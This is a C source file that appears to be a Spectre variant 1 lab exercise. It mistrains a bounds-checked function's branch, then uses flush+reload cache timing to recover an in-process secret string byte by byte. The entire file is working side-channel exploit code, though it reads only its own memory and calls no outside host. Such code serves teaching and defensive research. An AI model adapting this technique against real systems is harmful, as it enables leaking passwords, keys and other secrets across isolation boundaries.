#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 18;
uint8_t buffer[18] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (150)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 

}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 18; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  array[s*4096 + DELTA] += 88;
}

int main() {
  int i;
  uint8_t s;
  printf("The  secret value is: \n");
  for (int m=0; m<17;m++) {
	int freq[256] = {0};
	for (int i = 0; i < 256; i++) freq[i]=0;
	for(int k=0;k<5;k++){
		size_t larger_x = (size_t)(secret-(char*)buffer);
	  	flushSideChannel();
	 	for(i=0;i<256; i++) scores[i]=0; 
	  	for (i = 0; i < 1000; i++) {
	    		spectreAttack(larger_x+m);
	    		reloadSideChannelImproved();
	  	}
	
		int max = 1;
		for (i = 1; i < 256; i++){
		   if(scores[max] < scores[i])  
		     max = i;
		}
		freq[max]++;
	}
	int best = 0, pos = 1;
	for (int i=1;i<256;i++) {
		if(best < freq[i]) {
			pos = i;
			best = freq[i];
		}
	}
  	printf("%c \n", pos);
	
  }

  return (0); 
}
